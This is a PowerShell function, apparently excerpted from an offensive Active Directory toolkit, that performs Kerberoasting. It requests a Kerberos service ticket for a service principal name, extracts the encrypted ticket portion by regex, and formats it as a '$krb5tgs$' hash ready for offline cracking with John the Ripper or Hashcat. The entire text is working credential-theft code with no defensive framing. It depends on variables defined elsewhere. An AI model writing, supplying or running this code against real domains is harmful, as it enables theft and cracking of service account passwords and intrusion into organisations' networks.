function Get-SpnEncryptedTicket {

  $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
  $TicketByteStream = $Ticket.GetRequest()        
  if (!($TicketByteStream)) {Break}
    $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
    if ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
        $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
        $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
        $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
        if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {Break} 
        else {$Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))" }
    } 
    else {Break}
    if($Hash) {
      if ($OutputFormat -match 'John') {
          $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
      }
      else {
          if ($DistinguishedName -ne 'UNKNOWN') {
              $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
          }
          else {$UserDomain = 'UNKNOWN'}
          $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
      }
      $HashFormat
    }
}
